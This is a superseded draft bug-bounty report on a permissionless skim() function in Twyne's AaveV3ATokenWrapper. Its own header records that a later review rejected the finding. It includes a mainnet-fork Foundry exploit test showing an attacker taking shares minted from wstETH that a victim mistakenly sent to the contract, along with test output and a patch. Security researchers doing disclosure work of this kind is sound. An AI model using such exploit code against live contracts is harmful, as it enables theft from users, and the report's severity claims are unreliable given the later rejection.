# ⚠ SUPERSEDED 2026-04-28 — DO NOT SUBMIT

> **Status:** This document is a pre-codex-review draft from earlier on 2026-04-28. Its
> "submit anyway as Low" recommendation is SUPERSEDED by a later /codex outside-voice
> review that rejected the finding entirely.
>
> **Final verdict:** DO NOT SUBMIT. See
> [`findings/2026-04-27T21-19-03-033Z-AaveV3ATokenWrapper/REVIEWED-REJECTED-2026-04-28.md`](findings/2026-04-27T21-19-03-033Z-AaveV3ATokenWrapper/REVIEWED-REJECTED-2026-04-28.md)
> for the four reasons against (skim() is intentional BGD upstream behavior, requires
> user-error precondition, Twyne has no Medium tier, Immunefi v2.3 SC class doesn't fit).
>
> This file is left in the repo as historical context — the path from "looks like a
> finding" → "outside-voice review caught the false positive" is the discipline working
> as designed. The audit trail itself is the artifact.
>
> ---

# Submission candidate — Twyne `AaveV3ATokenWrapper.skim` permissionless (PRE-REVIEW DRAFT)

**Target program:** Twyne — https://immunefi.com/bug-bounty/twyne/
**Target contract (proxy, in scope):** `0xfaba8f777996c0c28fe9e6554d84cb30ca3e1881` (`awstETHWrapper`)
**Target impl (verified, behind proxy):** `0xff8cbf0bb4274cf82c23779ab04978d631a0a34e` (`AaveV3ATokenWrapper`)
**Discovered:** 2026-04-27 by solhunt autonomous agent (Claude Opus 4.7 via Max subscription)
**Confirmed:** Two independent solhunt scans (21:19 and 21:33 UTC) converged on the identical finding. Codex outside-voice validation (7/10 confidence the bug is real).

---

## ⚠ Decision pending: do not submit until Clayton signs off

This file is a **drafted submission**, not a sent one. Read all of it. Decide before submitting.

---

## TL;DR

`AaveV3ATokenWrapper.skim(address receiver)` is permissionless. Any caller mints ERC4626 shares to a receiver of their choice, backed by whatever underlying (wstETH) happens to sit on the wrapper proxy at call time. Any user who accidentally sends wstETH directly to the wrapper (instead of going through `deposit`) loses it to the first attacker who calls `skim`.

**Realistic severity per Immunefi v2.3:** Low/Informational. The precondition (stuck wstETH on the wrapper) is reachable only through user error — no standard Twyne flow leaves underlying tokens on the wrapper. /codex outside-voice spent 30 minutes tracing the codebase and confirmed: zero internal callers of `wrapper.skim()`, all deposit paths use `transferFrom + approve + deposit` (no transfer-then-callback race), Aave rewards go directly to recipients, all CollateralVault interaction routes through aTokens not underlying.

**Why submit anyway:**
1. The bug is real and audit-missed (Aave V3 wrapper code added 2026-02-13, after the Electisec April + June 2025 audits).
2. The naming convention `_CV` + `onlyCV` modifier is consistently applied elsewhere in the same contract (`burnShares_CV`, `rebalanceATokens_CV`); `skim` lacks both. Author oversight, not by-design.
3. Twyne added `skim` themselves; upstream BGD's `static-a-token-v3` has no equivalent. Not inherited Aave behavior.
4. Even Low/Informational establishes credibility with Twyne for future submissions.

**Honest framing risk:** Submitting as Critical/High will get downgraded fast and burn credibility. Submit as **Low** with the patch fix included. If Twyne's triager wants to argue Medium, let them.

---

## Vulnerability

### Affected function

```solidity
// AaveV3ATokenWrapper.sol L135 (impl 0xff8cbf0b...)
function skim(address receiver) external {           // ← NO MODIFIERS
    IERC20 __asset = IERC20(asset());
    uint256 assets = __asset.balanceOf(address(this));
    uint256 shares = _convertToShares(assets, Math.Rounding.Floor);
    require(shares > 0, StaticATokenInvalidZeroShares());
    POOL.supply(address(__asset), assets, address(this), 0);
    _mint(receiver, shares);                          // ← shares to attacker-chosen receiver
}
```

### Naming-convention evidence the modifier was intended

The same contract uses `_CV` suffix + `onlyCV` modifier consistently for any function meant to be called only by collateral vaults:

```solidity
modifier onlyCV {
    require(collateralVaultFactory.isCollateralVault(msg.sender), NotCollateralVault());
    _;
}
function rebalanceATokens_CV(uint shares) external onlyCV whenNotPaused { ... }
function burnShares_CV(...) external onlyCV { ... }   // (similar pattern)
```

`skim` has neither the suffix nor the modifier. This is anomalous within this contract.

### Upstream comparison

BGD Labs' `static-a-token-v3` (the parent pattern this wrapper inherits from) — https://github.com/bgd-labs/static-a-token-v3 — has **no** `skim` / `sweep` / `donate` function. Twyne added it.

### Audit coverage

- Electisec April 2025 audit (5 days, 2 auditors) — no high/critical findings
- Electisec June 2025 re-review (1.5 days, 1 auditor) — no high/critical findings
- The `AaveV3ATokenWrapper`, `AaveV3CollateralVault`, and Periphery `AaveV3Wrapper` were added to the repo **after** these audits. Aave V3 was added to Immunefi scope on **2026-02-13**.
- This code is **un-audited at time of disclosure**.

---

## Impact

### What can be stolen

Any wstETH that lands on the wrapper proxy `0xfaba8f777996c0c28fe9e6554d84cb30ca3e1881` outside of the `deposit` / `depositATokens` / `depositWithPermit` flow. Specifically:

1. **Direct user mistake**: a user calls `IERC20(wstETH).transfer(wrapper, amount)` instead of `wrapper.deposit(amount, receiver)`. Anyone watching pending txs / mempool can call `skim(attacker)` and capture the donated tokens.
2. **Integrator bug**: a third-party contract that wraps Twyne deposits and accidentally leaves a transient wstETH balance on the wrapper between two operations. Any block-level observer can `skim` between them.
3. **Force-feed via reentrancy or callback**: not currently demonstrated (no entry point found), but worth Twyne's analysis.

Current wstETH balance on the wrapper at time of disclosure: **0**. So nothing is at-risk *right now*. But the bug is a loaded gun: every future user mistake is theft.

### What can NOT be stolen

- Funds already deposited via `deposit` (those are tracked as shares to the depositor)
- aWSTETH balances held by collateral vaults
- Protocol treasury funds
- Any Aave-side state (out of scope per Twyne's program rules)

### Why severity is **not** Critical or High

Per /codex outside-voice's flow analysis (verified by reading `AaveV3CollateralVault._depositUnderlying`, Periphery `AaveV3Wrapper.depositUnderlyingToIntermediateVault`, all reward paths, all liquidation paths, all leverage operator paths):

- **No standard Twyne flow leaves wstETH on the wrapper.** All deposits use `transferFrom + approve + deposit` atomic sequence (no race window).
- **Zero callers of `wrapper.skim()`** in the entire Twyne codebase or test suite. The function is "dead code" from Twyne's perspective.
- The function is reachable via Aave V3 in-scope addition, but no flow forces a precondition.

Per Immunefi v2.3 severity rubric, "user error that does not lead to direct loss of protocol-controlled funds" is typically **Low** or **Informational**. Twyne's program rules will likely apply the same standard.

---

## Proof of concept

### Test file

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IWrapper {
    function skim(address receiver) external;
    function asset() external view returns (address);
    function balanceOf(address) external view returns (uint256);
    function paused() external view returns (bool);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract ExploitTest is Test {
    address constant WRAPPER = 0xFaBA8f777996C0C28fe9e6554D84cB30ca3e1881;

    function test_anyoneCanSkimDonatedAssets() public {
        IWrapper wrapper = IWrapper(WRAPPER);
        address underlying = wrapper.asset();           // wstETH

        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");

        // Realistic scenario: user calls IERC20.transfer(wrapper, x) instead of
        // going through depositATokens / depositWithPermit.
        uint256 donation = 1 ether;
        deal(underlying, victim, donation);
        vm.prank(victim);
        IERC20(underlying).transfer(WRAPPER, donation);

        assertEq(IERC20(underlying).balanceOf(WRAPPER), donation);
        assertEq(wrapper.balanceOf(attacker), 0);

        // Attacker (random EOA — not victim, not owner, not a CV) calls skim().
        // Function has no access control; underlying is not pulled from caller.
        vm.prank(attacker);
        wrapper.skim(attacker);

        // Attacker now owns shares minted from victim's tokens.
        assertGt(wrapper.balanceOf(attacker), 0);
        assertEq(IERC20(underlying).balanceOf(WRAPPER), 0);  // drained into Aave on wrapper's behalf

        emit log_named_uint("attacker shares stolen", wrapper.balanceOf(attacker));
        emit log_named_uint("victim donated (wei)", donation);
    }
}
```

### Run

```bash
forge test --match-path test/Exploit.t.sol -vv \
  --fork-url $ETH_MAINNET_RPC \
  --fork-block-number <recent>
```

### Output (verified)

```
Compiling 1 files with Solc 0.8.34
Solc 0.8.34 finished in 488.04ms

Ran 1 test for test/Exploit.t.sol:ExploitTest
[PASS] test_anyoneCanSkimDonatedAssets() (gas: 387277)
Logs:
  attacker shares stolen: 998533575456430027
  victim donated (wei): 1000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

The attacker's stolen shares (~0.998533 sw-units) redeem for approximately the donated 1 wstETH (0.998 share-to-asset rate at current Aave supply rate).

### No cheatcode bypass

The test uses only `deal()` (gives victim wstETH realistically — the attacker doesn't need it) and `vm.prank()` (impersonates a random EOA — anyone can call). It does NOT use `vm.store` to bypass any pause/init flag, does NOT use `vm.etch` to swap bytecode, does NOT prank as admin.

---

## Recommended fix

Add `onlyCV` (or strip the function entirely if no internal caller relies on it):

```solidity
function skim(address receiver) external onlyCV {     // ← ADDED MODIFIER
    IERC20 __asset = IERC20(asset());
    uint256 assets = __asset.balanceOf(address(this));
    uint256 shares = _convertToShares(assets, Math.Rounding.Floor);
    require(shares > 0, StaticATokenInvalidZeroShares());
    POOL.supply(address(__asset), assets, address(this), 0);
    _mint(receiver, shares);
}
```

Or rename to `skim_CV` to match the convention. Or remove entirely — /codex confirmed zero internal callers.

If Twyne wants permissionless donation recovery (some protocols do), the right pattern is to mint shares to the protocol treasury, not a caller-chosen receiver.

---

## Submission framing for Twyne

When Clayton submits, the framing should be honest:

> "Permissionless `skim(address receiver)` on `AaveV3ATokenWrapper` (impl 0xff8cbf0b... behind proxy 0xfaba8f77...) lacks the `onlyCV` modifier convention used elsewhere in the contract. Any caller can mint shares to a receiver of their choice, backed by underlying tokens accidentally sent to the wrapper proxy. The current wrapper balance is zero, but every future user mistake creates a theft window. The audit (Electisec April + June 2025) predates this code (Aave V3 added to scope 2026-02-13). The bug is reachable only via user error in the standard flow, so I'm submitting as Low/Informational and welcome a re-classification if the team finds an internal flow I missed."

Don't oversell as Critical. Don't claim "$X at risk" — wrapper has 0 right now. Don't wave hands about reentrancy / front-running unless you find a concrete demonstration.

---

## What's still TODO before submission

- [ ] Clayton reviews this file end-to-end
- [ ] Clayton runs the PoC locally to confirm reproducibility
- [ ] Clayton checks Immunefi for any pre-existing disclosure of this bug (audits + duplicate report search)
- [ ] Clayton confirms Twyne's KYC requirements (codex memo: no-KYC for Twyne)
- [ ] Decide severity classification: Low or Medium? (recommended: Low, let Twyne re-classify up if they want)
- [ ] Optional: hunt for higher-severity flow that REACHES the precondition standardly. If found, this becomes Medium/High.

---

## Reproducibility metadata

- Discovery scan id: `2026-04-27T21-19-03-033Z-AaveV3ATokenWrapper`
- Confirmation scan id: `2026-04-27T21-33-47-444Z-ERC1967Proxy` (independent, same target, same finding)
- Foundry test file: `findings/2026-04-27T21-19-03-033Z-AaveV3ATokenWrapper/Exploit.t.sol`
- Solc version: 0.8.34
- /codex validation transcript: `aea8f198f5f442c1b` (the strategy agent), `a6fc6b540d6cdec56` (the validation agent)
- Wrapper deployer: `0x05c859bf9424e7c40fed32a2b16ddb8433b44fbf`
- Wrapper deploy tx: `0x07630c05c6b9a4f19ba866dd68bcfdaf6f4ff8657668b21a10405eed90b350de`
